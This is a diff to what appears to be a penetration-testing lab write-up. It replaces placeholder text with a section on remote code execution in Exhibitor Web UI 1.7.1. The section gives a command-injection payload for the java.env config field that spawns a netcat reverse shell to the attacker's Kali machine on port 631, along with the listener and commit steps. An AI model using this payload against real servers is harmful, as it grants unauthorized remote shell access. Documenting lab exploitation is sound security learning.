@@ -182,13 +182,24 @@ Enumerated top 200 UDP ports:
 
 ![](Pasted%20image%2020221029153214.png)
 ![](Pasted%20image%2020221029153255.png)
-
+![](Pasted%20image%2020221029153321.png)
 
 ---
 
 # Exploitation
 ## Name of the technique
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
+## Remote Code Execution - Exhibitor Web UI 1.7.1
+
+#### -Clicked on the Config tab, then flipped the Editing switch to ON. Typed " $(/bin/nc -e /bin/sh [kali IP] 631 &)" in the java.env script area:
+
+![](Pasted%20image%2020221029153712.png)
+![](Pasted%20image%2020221029153742.png)
+
+#### -Started a penelope listener on my kali machine listening on port 631
+
+#### -Clicked "Commit" > "All At Once" > "OK" and waited about a minute for the script to run and received a reverse shell:
+
+
 
 ---
 
